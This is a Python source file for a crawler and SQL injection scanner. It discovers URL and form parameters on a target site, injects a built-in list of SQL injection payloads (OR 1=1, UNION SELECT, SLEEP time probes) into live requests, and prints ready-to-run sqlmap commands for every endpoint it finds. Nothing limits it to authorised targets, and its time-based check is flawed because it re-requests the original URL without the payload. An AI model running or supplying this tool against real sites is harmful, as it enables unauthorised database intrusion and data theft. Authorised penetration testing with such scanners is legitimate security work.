#!/usr/bin/env python3
"""
SUPER PARAM FINDER & SQLi VULNERABILITY SCANNER
Author: Security Researcher
Version: 3.0
"""

import requests
import re
import sys
import json
import time
import concurrent.futures
from urllib.parse import urlparse, urljoin, quote, parse_qs
from bs4 import BeautifulSoup
import threading
from queue import Queue
import argparse
import os
from colorama import init, Fore, Style, Back

init(autoreset=True)

class SuperParamFinder:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        })
        
        self.common_params = [
            'id', 'page', 'view', 'cat', 'category', 'product', 'prod_id', 'item', 'itemid',
            'user', 'user_id', 'uid', 'username', 'name', 'email', 'mail',
            'search', 'q', 'query', 's', 'keyword', 'find', 'term',
            'file', 'filename', 'path', 'dir', 'folder', 'document',
            'year', 'month', 'date', 'time', 'day', 'hour', 'minute',
            'order', 'sort', 'limit', 'offset', 'start', 'count', 'per_page',
            'action', 'do', 'mode', 'type', 'task', 'op', 'operation',
            'token', 'key', 'auth', 'session', 'sid', 'phpsessid',
            'callback', 'jsonp', 'format', 'output', 'response',
            'lang', 'language', 'locale', 'country', 'region',
            'debug', 'test', 'admin', 'manager', 'mod', 'edit',
            'id_product', 'id_category', 'id_user', 'id_order',
            'p', 'pid', 'page_id', 'post_id', 'article_id',
            'c', 'cid', 'course_id', 'class_id',
            'ref', 'referrer', 'source', 'utm_source',
            'tag', 'tags', 'label', 'group',
            'state', 'status', 'active', 'published',
            'price', 'cost', 'amount', 'total',
            'color', 'size', 'weight', 'dimension'
        ]
        
        self.sql_errors = [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"MySqlClient\.",
            r"ORA-\d{5}",
            r"Oracle error",
            r"Oracle.*Driver",
            r"PostgreSQL.*ERROR",
            r"Warning.*\Wpg_.*",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"Driver.*SQL[\-\_\ ]*Server",
            r"SQLServer.*Driver",
            r"Error.*SQL Server",
            r"Microsoft SQL Server",
            r"System\.Data\.SqlClient\.SqlException",
            r"(?s)Exception.*\WSystem\.Data\.SqlClient\W",
            r"SQLite/JDBCDriver",
            r"SQLite\.Exception",
            r"System\.Data\.SQLite\.SQLiteException",
            r"Warning.*sqlite_.*",
            r"Warning.*SQLite3::",
            r"\[SQLITE_ERROR\]",
            r"SQLite error \d+:",
            r"sqlite3.OperationalError:",
            r"SQLite3::SQLException",
            r"Microsoft Access Driver",
            r"JET Database Engine",
            r"Access Database Engine",
            r"ODBC Microsoft Access",
            r"Syntax error.*query expression",
            r"Unclosed quotation mark after the character string",
            r"Quoted string not properly terminated",
        ]
        
        self.payloads = [
            "'",
            "\"",
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "\" OR \"1\"=\"1",
            "' OR 'x'='x",
            "' OR 1=1--",
            "\" OR 1=1--",
            "' OR 1=1#",
            "\" OR 1=1#",
            "' OR 1=1;--",
            "1' ORDER BY 1--",
            "1' ORDER BY 2--",
            "1' ORDER BY 3--",
            "1' UNION SELECT NULL--",
            "1' UNION SELECT NULL,NULL--",
            "1' UNION SELECT NULL,NULL,NULL--",
            "1 AND 1=1",
            "1 AND 1=2",
            "1' AND '1'='1",
            "1' AND '1'='2",
            "1' AND SLEEP(5)--",
            "1' AND 1=(SELECT COUNT(*) FROM tabname)--",
            "1' AND 1=1 UNION SELECT 1,2,3--",
            "1' OR IF(1=1,SLEEP(5),0)--",
        ]
        
        self.results = []
        self.visited_urls = set()
        self.lock = threading.Lock()
        
    def print_banner(self):
        print(Fore.CYAN + """
╔══════════════════════════════════════════════════════════╗
║      SUPER PARAM FINDER & SQLi SCANNER v3.0             ║
║      Advanced Parameter Discovery & Vulnerability Check  ║
╚══════════════════════════════════════════════════════════╝
        """ + Style.RESET_ALL)
    
    def validate_url(self, url):
        """Validate and normalize URL"""
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        
        parsed = urlparse(url)
        if not parsed.netloc:
            return None
        
        return url
    
    def extract_urls_from_page(self, url, html_content):
        """Extract all URLs from page content"""
        urls = set()
        soup = BeautifulSoup(html_content, 'html.parser')
        base_url = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
        
        # Extract from href attributes
        for tag in soup.find_all(['a', 'link', 'area'], href=True):
            href = tag['href']
            full_url = urljoin(base_url, href)
            if self.is_valid_url(full_url):
                urls.add(full_url)
        
        # Extract from src attributes
        for tag in soup.find_all(['script', 'img', 'iframe', 'frame', 'embed'], src=True):
            src = tag['src']
            full_url = urljoin(base_url, src)
            if self.is_valid_url(full_url):
                urls.add(full_url)
        
        # Extract from form actions
        for form in soup.find_all('form', action=True):
            action = form['action']
            full_url = urljoin(base_url, action)
            if self.is_valid_url(full_url):
                urls.add(full_url)
        
        # Extract from meta refresh
        for meta in soup.find_all('meta', {'http-equiv': 'refresh'}):
            content = meta.get('content', '')
            if 'url=' in content.lower():
                refresh_url = content.split('url=')[-1].strip()
                full_url = urljoin(base_url, refresh_url)
                if self.is_valid_url(full_url):
                    urls.add(full_url)
        
        return urls
    
    def is_valid_url(self, url):
        """Check if URL is valid for crawling"""
        parsed = urlparse(url)
        
        # Filter out non-http protocols and invalid extensions
        if parsed.scheme not in ['http', 'https']:
            return False
        
        # Filter out common static files
        invalid_extensions = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.ico',
                             '.css', '.js', '.pdf', '.zip', '.rar', '.tar',
                             '.mp3', '.mp4', '.avi', '.mov', '.wmv',
                             '.woff', '.woff2', '.ttf', '.eot', '.svg']
        
        path = parsed.path.lower()
        if any(path.endswith(ext) for ext in invalid_extensions):
            return False
        
        # Filter out mailto, tel, etc
        if url.startswith(('mailto:', 'tel:', 'javascript:', '#')):
            return False
        
        return True
    
    def find_params_in_url(self, url):
        """Find parameters in a single URL"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if params:
            # Only include URLs with meaningful parameters
            meaningful_params = []
            for param in params.keys():
                param_lower = param.lower()
                # Filter out common tracking/analytics params
                if not any(track in param_lower for track in ['utm_', 'fbclid', 'gclid', 'msclkid', '_ga']):
                    meaningful_params.append(param)
            
            if meaningful_params:
                return {
                    'url': url,
                    'params': meaningful_params,
                    'method': 'GET'
                }
        
        return None
    
    def find_params_in_forms(self, url, html_content):
        """Find parameters in HTML forms"""
        forms_data = []
        soup = BeautifulSoup(html_content, 'html.parser')
        
        for form in soup.find_all('form'):
            form_action = form.get('action')
            form_method = form.get('method', 'GET').upper()
            
            # Build form URL
            if form_action:
                form_url = urljoin(url, form_action)
            else:
                form_url = url
            
            # Extract input fields
            inputs = form.find_all(['input', 'textarea', 'select'])
            form_params = []
            
            for inp in inputs:
                name = inp.get('name')
                if name:
                    form_params.append(name)
            
            if form_params:
                forms_data.append({
                    'url': form_url,
                    'params': form_params,
                    'method': form_method
                })
        
        return forms_data
    
    def test_sql_injection(self, url, method='GET', params=None):
        """Test for SQL injection vulnerabilities"""
        vulnerabilities = []
        
        if not params:
            parsed = urlparse(url)
            params_dict = parse_qs(parsed.query)
            params = list(params_dict.keys())
        
        for param in params:
            for payload in self.payloads[:10]:  # Test first 10 payloads
                try:
                    if method == 'GET':
                        # Build test URL
                        test_url = self.build_test_url(url, param, payload)
                        response = self.session.get(test_url, timeout=10)
                    else:
                        # For POST requests
                        data = {p: 'test' for p in params}
                        data[param] = payload
                        response = self.session.post(url, data=data, timeout=10)
                    
                    # Check for SQL errors
                    if self.check_sql_errors(response.text):
                        with self.lock:
                            vulnerabilities.append({
                                'url': url,
                                'parameter': param,
                                'payload': payload,
                                'method': method,
                                'vulnerable': True
                            })
                            self.print_vulnerability(url, param, payload)
                        break  # Stop testing this parameter if vulnerable
                    
                    # Check for time-based SQLi (simple check)
                    if "' AND SLEEP(" in payload or "' OR SLEEP(" in payload:
                        start_time = time.time()
                        self.session.get(url, timeout=15)
                        elapsed = time.time() - start_time
                        if elapsed > 4:  # If response took more than 4 seconds
                            with self.lock:
                                vulnerabilities.append({
                                    'url': url,
                                    'parameter': param,
                                    'payload': payload,
                                    'method': method,
                                    'type': 'Time-based',
                                    'vulnerable': True
                                })
                                self.print_vulnerability(url, param, payload, 'Time-based')
                
                except Exception as e:
                    continue
        
        return vulnerabilities
    
    def build_test_url(self, url, param, payload):
        """Build test URL with payload"""
        parsed = urlparse(url)
        params_dict = parse_qs(parsed.query)
        
        # Replace the target parameter value with payload
        if param in params_dict:
            params_dict[param] = [payload]
        else:
            # If parameter doesn't exist in original URL, add it
            params_dict[param] = [payload]
        
        # Rebuild query string
        query_parts = []
        for key, values in params_dict.items():
            for value in values:
                query_parts.append(f"{key}={quote(str(value))}")
        
        new_query = '&'.join(query_parts)
        
        # Reconstruct URL
        new_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        if new_query:
            new_url += f"?{new_query}"
        if parsed.fragment:
            new_url += f"#{parsed.fragment}"
        
        return new_url
    
    def check_sql_errors(self, response_text):
        """Check response for SQL error messages"""
        response_lower = response_text.lower()
        
        for error_pattern in self.sql_errors:
            if re.search(error_pattern, response_text, re.IGNORECASE):
                return True
        
        # Check for generic error patterns
        generic_errors = [
            r"error.*sql",
            r"syntax error",
            r"unexpected token",
            r"database error",
            r"sql.*error",
            r"mysql.*error",
            r"postgresql.*error",
            r"sqlite.*error",
            r"odbc.*error",
            r"pdo.*error"
        ]
        
        for pattern in generic_errors:
            if re.search(pattern, response_lower):
                return True
        
        return False
    
    def print_vulnerability(self, url, param, payload, vuln_type='SQLi'):
        """Print vulnerability found"""
        print(f"\n{Back.RED}{Fore.WHITE}[!] VULNERABILITY FOUND!{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}URL:{Style.RESET_ALL} {url}")
        print(f"{Fore.YELLOW}Parameter:{Style.RESET_ALL} {param}")
        print(f"{Fore.YELLOW}Payload:{Style.RESET_ALL} {payload}")
        print(f"{Fore.YELLOW}Type:{Style.RESET_ALL} {vuln_type}")
        print(f"{Fore.YELLOW}Time:{Style.RESET_ALL} {time.strftime('%Y-%m-%d %H:%M:%S')}")
        print("-" * 60)
    
    def crawl_and_find_params(self, start_url, max_pages=50, max_depth=2):
        """Main crawling function to find parameters"""
        print(f"\n{Fore.GREEN}[*] Starting crawl from: {start_url}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Max pages: {max_pages} | Max depth: {max_depth}{Style.RESET_ALL}")
        
        url_queue = Queue()
        url_queue.put((start_url, 0))
        
        results = []
        pages_crawled = 0
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = []
            
            while (not url_queue.empty() and pages_crawled < max_pages and 
                   len(futures) < max_pages):
                
                url, depth = url_queue.get()
                
                if url in self.visited_urls or depth > max_depth:
                    continue
                
                self.visited_urls.add(url)
                future = executor.submit(self.process_url, url, depth)
                futures.append(future)
            
            # Process completed futures
            for future in concurrent.futures.as_completed(futures):
                try:
                    page_result = future.result(timeout=30)
                    if page_result:
                        url, page_params, new_urls = page_result
                        
                        # Add found parameters to results
                        for param_data in page_params:
                            if param_data not in results:
                                results.append(param_data)
                                self.print_param_found(param_data)
                        
                        # Add new URLs to queue
                        for new_url in new_urls:
                            if new_url not in self.visited_urls:
                                parsed = urlparse(new_url)
                                if parsed.netloc == urlparse(start_url).netloc:
                                    url_queue.put((new_url, depth + 1))
                        
                        pages_crawled += 1
                        print(f"{Fore.GREEN}[+] Crawled: {pages_crawled}/{max_pages} pages{Style.RESET_ALL}", end='\r')
                
                except Exception as e:
                    continue
        
        print(f"\n{Fore.GREEN}[+] Crawling completed! Found {len(results)} parameter endpoints.{Style.RESET_ALL}")
        return results
    
    def process_url(self, url, depth):
        """Process a single URL"""
        try:
            response = self.session.get(url, timeout=10)
            response.raise_for_status()
            
            # Find parameters in URL
            url_params = self.find_params_in_url(url)
            
            # Find parameters in forms
            form_params = self.find_params_in_forms(url, response.text)
            
            # Combine all parameters
            all_params = []
            if url_params:
                all_params.append(url_params)
            all_params.extend(form_params)
            
            # Extract new URLs from page
            new_urls = self.extract_urls_from_page(url, response.text)
            
            return url, all_params, new_urls
        
        except Exception as e:
            return None
    
    def print_param_found(self, param_data):
        """Print found parameter"""
        print(f"\n{Fore.CYAN}[+] Parameter Found:{Style.RESET_ALL}")
        print(f"   {Fore.YELLOW}URL:{Style.RESET_ALL} {param_data['url']}")
        print(f"   {Fore.YELLOW}Method:{Style.RESET_ALL} {param_data['method']}")
        print(f"   {Fore.YELLOW}Parameters:{Style.RESET_ALL} {', '.join(param_data['params'])}")
        
        # Generate sqlmap command
        if param_data['method'] == 'GET':
            sqlmap_cmd = f"sqlmap -u \"{param_data['url']}\" --batch"
            if len(param_data['params']) <= 5:
                sqlmap_cmd += f" -p \"{','.join(param_data['params'])}\""
            print(f"   {Fore.GREEN}Sqlmap:{Style.RESET_ALL} {sqlmap_cmd}")
        else:
            # For POST requests
            post_data = '&'.join([f"{p}=FUZZ" for p in param_data['params']])
            sqlmap_cmd = f"sqlmap -u \"{param_data['url']}\" --data=\"{post_data}\" --method=POST --batch"
            print(f"   {Fore.GREEN}Sqlmap:{Style.RESET_ALL} {sqlmap_cmd}")
    
    def quick_scan(self, url):
        """Quick scan for parameters without deep crawling"""
        print(f"\n{Fore.GREEN}[*] Quick scanning: {url}{Style.RESET_ALL}")
        
        try:
            response = self.session.get(url, timeout=10)
            
            # Check current URL for parameters
            url_params = self.find_params_in_url(url)
            
            # Check forms on page
            form_params = self.find_params_in_forms(url, response.text)
            
            # Combine results
            results = []
            if url_params:
                results.append(url_params)
            results.extend(form_params)
            
            # Also test common parameters
            print(f"{Fore.CYAN}[*] Testing common parameters...{Style.RESET_ALL}")
            common_results = self.test_common_params(url)
            results.extend(common_results)
            
            return results
        
        except Exception as e:
            print(f"{Fore.RED}[-] Error scanning {url}: {str(e)}{Style.RESET_ALL}")
            return []
    
    def test_common_params(self, url):
        """Test URL with common parameters"""
        results = []
        parsed = urlparse(url)
        
        # Get base URL without query
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        # Test each common parameter
        for param in self.common_params[:20]:  # Test first 20
            test_url = f"{base_url}?{param}=test"
            if '?' in url:
                test_url = f"{url}&{param}=test"
            
            try:
                response = self.session.get(test_url, timeout=5)
                
                # Check if parameter is accepted (simple heuristic)
                if response.status_code == 200:
                    # Check if response is different from original
                    original_response = self.session.get(url, timeout=5)
                    
                    # Simple check: if parameter appears to be processed
                    if 'test' in response.text or response.text != original_response.text:
                        results.append({
                            'url': test_url,
                            'params': [param],
                            'method': 'GET',
                            'type': 'common_parameter'
                        })
            
            except:
                continue
        
        return results
    
    def save_results(self, results, filename="scan_results.json"):
        """Save results to JSON file"""
        with open(filename, 'w') as f:
            json.dump(results, f, indent=2)
        print(f"\n{Fore.GREEN}[+] Results saved to: {filename}{Style.RESET_ALL}")
    
    def generate_report(self, results):
        """Generate HTML report"""
        html = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Parameter Discovery Report</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 40px; }
                h1 { color: #333; }
                .vulnerable { background-color: #ffcccc; padding: 10px; margin: 10px 0; border-left: 5px solid red; }
                .param { background-color: #e6f7ff; padding: 10px; margin: 10px 0; border-left: 5px solid #1890ff; }
                .sqlmap { background-color: #f0f0f0; padding: 5px; font-family: monospace; }
                .timestamp { color: #666; font-size: 12px; }
            </style>
        </head>
        <body>
            <h1>Parameter Discovery Report</h1>
            <p class="timestamp">Generated on: """ + time.strftime('%Y-%m-%d %H:%M:%S') + """</p>
        """
        
        for i, result in enumerate(results, 1):
            html += f"""
            <div class="param">
                <h3>Endpoint #{i}</h3>
                <p><strong>URL:</strong> {result['url']}</p>
                <p><strong>Method:</strong> {result['method']}</p>
                <p><strong>Parameters:</strong> {', '.join(result['params'])}</p>
                <p><strong>Sqlmap Command:</strong></p>
                <div class="sqlmap">
            """
            
            if result['method'] == 'GET':
                cmd = f"sqlmap -u \"{result['url']}\" --batch"
                if len(result['params']) <= 5:
                    cmd += f" -p \"{','.join(result['params'])}\""
                html += cmd
            else:
                post_data = '&'.join([f"{p}=FUZZ" for p in result['params']])
                cmd = f"sqlmap -u \"{result['url']}\" --data=\"{post_data}\" --method=POST --batch"
                html += cmd
            
            html += """
                </div>
            </div>
            """
        
        html += """
        </body>
        </html>
        """
        
        report_file = f"report_{int(time.time())}.html"
        with open(report_file, 'w') as f:
            f.write(html)
        
        print(f"{Fore.GREEN}[+] HTML report generated: {report_file}{Style.RESET_ALL}")
        return report_file

def main():
    parser = argparse.ArgumentParser(description='Super Parameter Finder & SQLi Scanner')
    parser.add_argument('-u', '--url', help='Target URL to scan')
    parser.add_argument('-f', '--file', help='File containing list of URLs')
    parser.add_argument('-o', '--output', help='Output file for results')
    parser.add_argument('-q', '--quick', action='store_true', help='Quick scan mode')
    parser.add_argument('-d', '--depth', type=int, default=2, help='Crawl depth (default: 2)')
    parser.add_argument('-m', '--max', type=int, default=50, help='Max pages to crawl (default: 50)')
    parser.add_argument('--test-sqli', action='store_true', help='Test for SQL injection')
    
    args = parser.parse_args()
    
    scanner = SuperParamFinder()
    scanner.print_banner()
    
    urls_to_scan = []
    
    # Get URL input
    if args.url:
        urls_to_scan.append(args.url)
    elif args.file:
        try:
            with open(args.file, 'r') as f:
                urls_to_scan = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"{Fore.RED}[!] File not found: {args.file}{Style.RESET_ALL}")
            sys.exit(1)
    else:
        print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}SUPER PARAM FINDER & SQLi SCANNER{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        
        while True:
            url_input = input(f"\n{Fore.GREEN}Input URL (or 'quit' to exit): {Style.RESET_ALL}").strip()
            
            if url_input.lower() in ['quit', 'exit', 'q']:
                print(f"{Fore.YELLOW}[*] Exiting...{Style.RESET_ALL}")
                sys.exit(0)
            
            validated_url = scanner.validate_url(url_input)
            if validated_url:
                urls_to_scan.append(validated_url)
                break
            else:
                print(f"{Fore.RED}[!] Invalid URL. Please enter a valid URL.{Style.RESET_ALL}")
    
    # Scan each URL
    all_results = []
    
    for url in urls_to_scan:
        print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}SCANNING: {url}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        
        if args.quick:
            results = scanner.quick_scan(url)
        else:
            results = scanner.crawl_and_find_params(url, max_pages=args.max, max_depth=args.depth)
        
        # Test for SQL injection if requested
        if args.test_sqli and results:
            print(f"\n{Fore.YELLOW}[*] Testing for SQL injection vulnerabilities...{Style.RESET_ALL}")
            for result in results:
                vulnerabilities = scanner.test_sql_injection(
                    result['url'],
                    result['method'],
                    result['params']
                )
                if vulnerabilities:
                    result['vulnerabilities'] = vulnerabilities
        
        all_results.extend(results)
    
    # Generate output
    if all_results:
        print(f"\n{Fore.GREEN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}SCAN COMPLETED!{Style.RESET_ALL}")
        print(f"{Fore.GREEN}Found {len(all_results)} parameter endpoints{Style.RESET_ALL}")
        print(f"{Fore.GREEN}{'='*60}{Style.RESET_ALL}")
        
        # Save results
        output_file = args.output or f"scan_results_{int(time.time())}.json"
        scanner.save_results(all_results, output_file)
        
        # Generate HTML report
        scanner.generate_report(all_results)
        
        # Print summary
        print(f"\n{Fore.CYAN}[*] SUMMARY:{Style.RESET_ALL}")
        for i, result in enumerate(all_results[:10], 1):  # Show first 10
            print(f"\n{i}. {result['url']}")
            print(f"   Method: {result['method']}")
            print(f"   Parameters: {', '.join(result['params'][:5])}")
            if len(result['params']) > 5:
                print(f"   (+ {len(result['params']) - 5} more)")
        
        if len(all_results) > 10:
            print(f"\n{Fore.YELLOW}[...] and {len(all_results) - 10} more endpoints{Style.RESET_ALL}")
    
    else:
        print(f"\n{Fore.RED}[!] No parameters found!{Style.RESET_ALL}")
    
    print(f"\n{Fore.GREEN}[+] Done!{Style.RESET_ALL}")

if __name__ == "__main__":
    # Check dependencies
    try:
        import requests
        from bs4 import BeautifulSoup
        from colorama import Fore, Style, init
    except ImportError:
        print("Installing dependencies...")
        import subprocess
        subprocess.check_call([sys.executable, "-m", "pip", "install", 
                              "requests", "beautifulsoup4", "colorama", "lxml"])
        print("\nDependencies installed. Please run the script again.")
        sys.exit(0)
    
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}[*] Scan interrupted by user{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")
        sys.exit(1)
